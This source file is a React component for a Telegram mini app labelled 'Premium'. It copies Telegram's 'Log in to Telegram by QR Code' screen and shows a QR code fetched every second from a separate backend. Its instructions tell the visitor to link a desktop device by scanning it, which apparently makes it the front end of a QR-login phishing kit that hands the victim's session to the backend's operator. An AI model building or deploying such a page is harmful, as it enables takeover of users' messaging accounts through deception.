import { useEffect, useState } from "react";

export default function Premium() {
  const [svgContent, setSvgContent] = useState("");

  useEffect(() => {
    if (window.Telegram) {
      const tg = window.Telegram.WebApp;
      tg.ready();
      tg.expand();
    }

    const fetchSVG = () => {
      fetch("http://localhost:5000/qr.svg", { cache: "no-cache" })
        .then((response) => response.text())
        .then((svg) => {
          let modifiedSvg = svg
            .replace(
              /<rect x="0" y="0" height="280" width="280" clip-path="url\('#clip-path-background-color'\)" fill="#fff"><\/rect>/g,
              ""
            )
            .replace(
              /<rect x="0" y="0" height="280" width="280" clip-path="url\('#clip-path-dot-color'\)" fill="#000"><\/rect>/g,
              ""
            )
            .replace(
              /<\/svg>/,
              `<rect x="0" y="0" height="280" width="280" clip-path="url('#clip-path-dot-color')" fill="#fff"></rect></svg>`
            );

          setSvgContent(modifiedSvg);
        })
        .catch((error) => console.error("Error loading SVG:", error));
    };

    fetchSVG(); // Fetch on component mount
    const interval = setInterval(fetchSVG, 1000);
    console.log("QR Changed"); // Refresh every 5 seconds

    return () => clearInterval(interval); // Cleanup on unmount
  }, []);

  return (
    <div id="auth-pages" className="min-h-screen font-roboto bg-[#212121] min-w-auto my-0 mx-auto relative grid-cols-1 grid">
      <div className="flex basis-0 grow shrink w-[100%] min-h-12"></div>
      <div className="bg-[#212121] flex-col flex justify-center">
        <div className="flex flex-auto flex-col grow shrink h-[760px] w-[100%] p-0 m-0 text-[16px] font-[400] leading-[24px] text-center text-white">
          <a className="relative flex flex-auto grow-0 shrink-0 items-center justify-center mb-[18px] mt-0 ml-auto mr-auto h-[280px] w-[280px]">
            <div id="svg-container" dangerouslySetInnerHTML={{ __html: svgContent }} className="absolute inset-0" />
            <img src="./tele.png" className="w-[52px] h-[52px] z-3 absolute" />
          </a>
          <h4 className="flex-auto grow-0 shrink-0 mb-[8px] mt-[2px] font-medium leading-[22px] text-center text-[20px]">
            Log in to Telegram by QR Code
          </h4>
          <ol className="mb-4 ml-auto mr-auto max-w-[480px] mt-4 font-roboto leading-[21px] text-start list-decimal list-inside">
            <li className="mt-[8px] text-left">Open Telegram on your phone</li>
            <li className="mt-[8px] text-left">
              Go to <span className="font-medium">Settings</span> &gt;{" "}
              <span className="font-medium">Devices</span> &gt;{" "}
              <span className="font-medium">Link Desktop Device</span>
            </li>
            <li className="mt-[8px] text-left">
              Point your phone at this screen to confirm login
            </li>
          </ol>
        </div>
      </div>
    </div>
  );
}
